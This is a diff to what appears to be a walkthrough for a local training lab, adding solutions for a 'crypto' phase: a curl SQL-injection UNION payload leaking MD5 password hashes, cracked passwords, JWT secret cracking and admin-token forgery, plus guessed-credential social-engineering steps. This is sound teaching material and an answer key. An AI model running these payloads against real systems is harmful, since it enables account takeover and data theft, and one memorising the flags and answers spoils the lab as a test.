@@ -15,12 +15,22 @@ was not available.
    Linux container, so test it there.
 6. `pipx install pip-audit && python3 labctl.py audit` prints the P5-03 flag. If
    it can't resolve, run `pip-audit` inside the container.
-7. Phase 5c social engineering, in the browser at `/intranet` (logged in as a
+7. Phase 5b crypto, all against the running portal:
+   - P5B-01: `curl "http://127.0.0.1:8080/student/search?q=zzz%25'%20UNION%20SELECT%20username,md5_password%20FROM%20legacy_staff--%20-"`
+     (with a logged-in session) leaks the MD5; crack to `chocolate`; log in at
+     `/staff/login`.
+   - P5B-02: the `mfano_vault` cookie base64-decodes to the flag.
+   - P5B-03: crack the `mfano_api` JWT secret (`mfano123`), forge `role=admin`,
+     `curl -H "Authorization: Bearer <forged>" .../api/exam-key`.
+   - P5B-04: `curl .../static/app.config.js`, then the openssl decrypt in
+     `SOLUTIONS.md`.
+   - P5B-05: run the byte-at-a-time script in `SOLUTIONS.md` against `/api/seal`.
+8. Phase 5c social engineering, in the browser at `/intranet` (logged in as a
    student):
    - SE-01: read `/intranet/directory` (`d.mwaura`) and `/intranet/noticeboard`
      (Simba, 1980), then sign in at `/intranet/login` as `d.mwaura` / `Simba1980`.
    - SE-02: at `/intranet/webmail`, tick #2 and #4 only, submit.
    - SE-03: at `/intranet/helpdesk`, say "reset for d.mwaura, pet is Simba".
    None of these send real mail or take a real credential.
-8. Submit every flag in `SOLUTIONS.md` with `labctl submit` and check that
-   `labctl status` reaches 27 / 27.
+9. Submit every flag in `SOLUTIONS.md` with `labctl submit` and check that
+   `labctl status` reaches 32 / 32.
